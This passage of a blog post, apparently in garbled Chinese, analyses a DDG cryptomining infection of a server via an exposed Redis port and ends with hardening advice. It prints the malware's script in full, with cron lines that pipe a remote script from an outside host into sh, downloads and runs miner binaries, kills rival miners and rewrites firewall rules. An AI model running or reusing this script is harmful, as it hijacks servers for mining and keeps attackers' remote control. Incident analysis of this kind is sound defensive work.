class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:/bin:/usr/bin:/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/bin:/usr/sbin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /var/spool/cron/crontabs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/crontabs/root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/ddg.217&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chmod +x /tmp/ddg.217 &amp;amp;&amp;amp; /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;killall /tmp/ddg.216&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/opt/yam&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    rm -rf /opt/yam&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep /tmp/duckduckgo|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/usr/bin/cron&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/opt/cron&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;â–½&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/usr/sbin/ntp&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;/opt/minerd&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;mine.moneropool.com&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;xmr.crypto-pool.fr:8080&quot;&lt;/span&gt;|awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;|xargs &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; -9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#/opt/minerd -h&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#if [ $? != &quot;0&quot; ]; then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#ps auxf|grep -v grep|grep &quot;/opt/minerd&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#if [ $? != &quot;0&quot; ]; then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#if [ ! -f /opt/yam ]; then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;#curl -fsSL http://www.haveabitchin.com/yam -o /opt/yam&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#chmod +x /opt/yam &amp;amp;&amp;amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoMiner&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/AnXqV&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    chmod +x /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /tmp/AnXqV -B &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND&lt;span class=&quot;built_in&quot;&gt;fg&lt;/span&gt;MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC&quot;&lt;/span&gt; || DoMiner&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoRedis6379&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p tcp &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; 127.0.0.1 --dport 6379 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -I INPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D OUTPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D INPUT -j REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#iptables -N REDIS6379 &amp;amp;&amp;amp; DoRedis6379&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ†æäº†ä¸€ä¸‹ï¼Œå®ƒé™¤äº†è‡ªèº«è¿›ç¨‹å¤–ï¼Œè¿˜æœ‰3ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè€Œä¸”è¿™5ä¸ªè¿›ç¨‹çš„PIDå’Œåç§°æ¯ç§’éƒ½åœ¨å˜åŒ–ï¼Œä¼°è®¡æ˜¯åœ¨ä¸åœçš„é‡å»ºå§ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥åŠæ·»åŠ æœåŠ¡å®šæ—¶æ‰§è¡Œè„šæœ¬ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /var/spool/cron/crontabs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/crontabs/root&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¸‹è½½ç—…æ¯’æ–‡ä»¶ï¼Œä¸»è¦æ˜¯æˆªå–æˆ‘6379è¿™ä¸ªç«¯å£ï¼Œææƒï¼Œç­‰ç­‰ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶å¯¹æ–¹åšè¿‡åŠ å¯†çš„ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/ddg.217&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chmod +x /tmp/ddg.217 &amp;amp;&amp;amp; /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;killall /tmp/ddg.216&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/opt/yam&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    rm -rf /opt/yam&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç¬¬äºŒä¸ªç—…æ¯’æ–‡ä»¶ï¼Œåå‘ä»£ç†è‚‰é¸¡çš„æœ¨é©¬ï¼Œä¹ŸåŠ å¯†è¿‡çš„ã€‚ä¸‹è½½æ”¾åˆ°/tmp/ä¸‹é¢ è¿™ä¸ªæ˜¯ä¸´æ—¶æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoMiner&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/AnXqV&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    chmod +x /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /tmp/AnXqV -B &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND&lt;span class=&quot;built_in&quot;&gt;fg&lt;/span&gt;MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC&quot;&lt;/span&gt; || DoMiner&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯¹æ–¹é…ç½®çš„é˜²ç«å¢™è§„åˆ™ï¼š&lt;/p&gt;
&lt;p&gt;6379 æœ¬åœ°è®¿é—®ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoRedis6379&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p tcp &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; 127.0.0.1 --dport 6379 -j ACCEPT    //åªå…è®¸127.0.0.1è®¿é—®6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -I INPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D OUTPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D INPUT -j REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#iptables -N REDIS6379 &amp;amp;&amp;amp; DoRedis6379&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ é™¤è¿™äº›æ–‡ä»¶ï¼Œåœ¨çœ‹çœ‹å°±æ²¡é—®é¢˜äº†ï¼Œåé¢æŠŠredisè®¾ç½®äº†ã€‚ æˆ‘ä»¬å½“åˆè®¾ç½®äº†åå‘ä»£ç†å’Œé˜²ç«å¢™è§„åˆ™ï¼Œæƒé™è®¾ç½®äº†å¾ˆç»†ï¼Œåªèƒ½æ™®é€šç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;æ€»ç»“ï¼š&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡å‘ç”Ÿç ´ç­æ€§çš„æ”»å‡»ï¼Œæ€»ç»“ç»éªŒè¿™é‡Œgitlabèµ°rediså•ç‹¬èµ°æœ¬åœ°ï¼šè®¾ç½®ï¼šbindå•ç‹¬æœ¬åœ°è·‘ã€‚127.0.0.1 ç¬¬äºŒï¼šæ™®é€šç”¨æˆ·å¯åŠ¨redisï¼Œç¬¬ä¸‰ï¼šè®¾ç½®é˜²ç«å¢™ã€‚ &lt;/p&gt;
</content>
    
    <summary type="html">
    
